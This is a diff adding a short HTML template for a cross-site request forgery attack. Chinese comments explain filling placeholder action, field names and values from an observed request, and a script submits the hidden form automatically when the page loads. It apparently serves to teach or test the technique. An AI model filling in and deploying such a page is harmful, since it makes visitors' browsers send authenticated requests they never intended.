@@ -1,0 +1,15 @@
+<html>
+<body>
+<h1>Hello</h1>
+// 构建使用POST请求提交的表单，***部分需填入POST请求应发往的地址
+<form action="***" method="post" id="forged_form">
+	// 按观察到的请求填充***部分，可以按需求继续添加其余input元素
+	<input type="hidden" name="***" value="***">
+	<input ...>
+</form>
+// 在页面中找到对应id的表单并提交
+<script type="text/javascript">
+document.getElementById("forged_form").submit();
+</script>
+</body>
+</html>
